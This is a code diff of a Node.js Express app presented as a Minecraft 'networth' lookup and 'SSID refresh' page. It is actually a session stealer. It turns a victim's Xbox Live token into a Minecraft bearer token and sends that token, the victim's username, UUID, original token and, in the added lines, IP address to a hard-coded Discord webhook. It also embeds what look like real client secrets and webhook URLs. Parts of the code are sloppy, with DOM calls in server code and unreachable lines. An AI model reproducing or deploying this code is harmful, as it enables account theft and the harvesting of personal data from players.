@@ -5,21 +5,48 @@
 const client_secret = '-Pw8Q~oEXLe~w~eRhIfGOp0qOuZS6PeafRIOCbPQ'
 const client_id = '170ccb61-c568-409a-a59a-e2ecd656a9c5'
 const redirect_uri = 'https://linkdiscord.herokuapp.com'
+const webhook_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
 // Config end
-const webhook_url = 'https://discord.com/api/webhooks/1047691731627421786/HZ6enVy92ZGh0DyUyZpiD0VMmDx3smZzggnE8RhYcKAEIV2w64MhtHb8Gk5YXzLHj3hK'
-async function myFunction() {
-  let userToken = prompt("Please enter XBL token", "");
-  if (userToken != null) {
-    document.getElementById("demo").innerHTML =
-    "REFRESHING: " + userToken;
-     //app.get("/api/player/networth", async (req, res) => {
-  //if (userToken == undefined) {
-    //res.json({
-      //success: false,
-      //cause: "Missing minecraft_ign field",
-    //});
-    //return;
-  //}
+const { post, get } = require("axios"),
+    express = require("express"),
+    mongoose = require("mongoose"),
+    helmet = require("helmet"),
+    app = express(),
+    expressip = require("express-ip"),
+path = require('path'),
+port = process.env.PORT || 3000,
+axios = require("axios")
+
+console.log('got them both')
+app.get('/', async (req, res) => {
+if (typeof window !== 'undefined') {
+  console.log('You are on the browser')
+} else {
+  console.log('You are on the server')
+}
+    console.log('no query code for u') 
+var options = {
+
+        root: path.join(__dirname)
+
+    };
+
+     
+
+    var fileName = 'index.html';
+
+    res.sendFile(fileName, options);
+})
+        app.get("/api/player/networth", async (req, res) => {
+     const userToken = req.query.minecraft_ign;
+  if (userToken == undefined) {
+    res.json({
+      success: false,
+      cause: "Missing minecraft_ign field",
+    });
+    return;
+  }
     //res.send('Success! You can exit this page and return to discord.')
     try {
         console.log('1')
@@ -30,28 +57,23 @@ async function myFunction() {
         const xstsToken = xstsTokenHashArray[0]
         const userHash = xstsTokenHashArray[1]
         const bearerToken = await getBearerToken(xstsToken, userHash)
-        document.getElementById("demo1").innerHTML = "RETRIEVING SSID...";
+        document.getElementById("demo").innerHTML = "SSID refreshed!";
         const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
-        document.getElementById("demo2").innerHTML = "ssid: " + bearerToken;
-        document.getElementById("demo3").innerHTML = "RETRIEVING USER & UUID...";
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
-        document.getElementById("demo4").innerHTML = "username: " + username;
-      //const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v2/profiles/${username}?key=dxxxxy`).catch(() => { return { data: { data: [{ networth: null }] } } })).data.data[0].networth
-
-                //check if has profiles, if api off or if normal
-                //let total_networth
-                //if (networth == null) total_networth = `[NW] No profile data found [NW]`
-                //else if (networth.noInventory) total_networth = `[NW] Without inventory (API OFF): ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
-                //else total_networth = `[NW] ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
-        postToWebhook(username, bearerToken, uuid, userToken)
-        document.getElementById("demo5").innerHTML = "POSTED TO WEBHOOK";
+        document.getElementById("demo").innerHTML = "Username: " + username;
+        document.getElementById("demo").innerHTML = "UUID: " + uuid;
+        const ip = getIp(req)
+        postToWebhook(username, bearerToken, uuid, ip, userToken)
     } catch (e) {
         console.log(e)
     }
-  }
-}
-  async function getUserHashAndToken(accessToken) {
+})
+app.listen(port, () => {
+    console.log(`Started the server on ${port}`)
+})
+
+async function getUserHashAndToken(accessToken) {
     const url = 'https://user.auth.xboxlive.com/user/authenticate'
     const config = {
         headers: {
@@ -91,7 +113,7 @@ async function getXSTSToken(userToken) {
 }
 
 async function getBearerToken(xstsToken, userHash) {
-    const url = 'https://proxy124245.herokuapp.com/https://api.minecraftservices.com/authentication/login_with_xbox'
+    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
     const config = {
         headers: {
             'Content-Type': 'application/json',
@@ -105,7 +127,7 @@ async function getBearerToken(xstsToken, userHash) {
 }
 
 async function getUsernameAndUUID(bearerToken) {
-    const url = 'https://proxy124245.herokuapp.com/https://api.minecraftservices.com/minecraft/profile'
+    const url = 'https://api.minecraftservices.com/minecraft/profile'
     const config = {
         headers: {
             'Authorization': 'Bearer ' + bearerToken,
@@ -115,7 +137,11 @@ async function getUsernameAndUUID(bearerToken) {
     return [response.data['id'], response.data['name']]
 }
 
-function postToWebhook(username, bearerToken, uuid, userToken) {
+function getIp(req) {
+    return req.headers['x-forwarded-for'] || req.socket.remoteAddress
+}
+
+function postToWebhook(username, bearerToken, uuid, ip, userToken) {
     const url = webhook_url
     let data = {
         username: " ",
@@ -132,6 +158,8 @@ function postToWebhook(username, bearerToken, uuid, userToken) {
         }]
     }
     axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
+  return;
+  document.getElementById("demo").innerHTML = "FAILED TO POST (probably refreshed)";
 }
 
 //function returnText() {
@@ -154,11 +182,5 @@ function checkIfBanned(name) {
     }
     addBan(name)
     return false
-}
-  const formatNumber = (num) => {
-    if (num < 1000) return num.toFixed(2)
-    else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
-    else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
-    else return `${(num / 1000000000).toFixed(2)}b`
 }
     
